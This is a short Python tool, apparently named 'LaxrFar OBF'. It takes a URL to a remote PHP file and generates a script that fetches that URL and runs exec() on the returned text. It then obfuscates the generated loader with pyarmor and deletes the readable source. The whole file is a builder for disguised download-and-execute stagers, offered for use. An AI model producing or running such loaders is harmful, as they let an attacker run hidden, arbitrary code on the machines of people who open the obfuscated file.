import os
import json

if os.name == 'nt':
    os.system("title LaxrFar OBF")

if not os.path.exists('config.json'):
    print('[CONFIG] Creating config file!')
    url = input('[CONFIG] URL TO PHP FILE >> ')
    with open('config.json', 'w') as f:
        data = {}
        data = ({
            'url' : url,
        })
        json.dump(data, f)
else:
    with open('config.json', 'r') as f:
        data = json.load(f)
    url = data['url']

f = open("obfuscated.py", "w")
f.write("""try:
    import requests
except Exception:
    os.system("pip install requests")
    os.system("pip3 install requests")
    import requests
""")
f.write("headers = {")
f.write(f"\n")
f.write(f"    'User-Agent': 'LaxrFar-OBF',")
f.write(f"\n")
f.write("}")
f.write(f"\n")
f.write(f"response = requests.get('{url}', headers=headers)")
f.write(f"\n")
f.write(f"exec(response.text)")
f.write(f"\n")
f.close()

os.system("pip install pyarmor")
os.system("pip3 install pyarmor")
os.system("pyarmor o --exact obfuscated.py")
os.remove("obfuscated.py")
print()
print()
print("Obfuscation Complete")
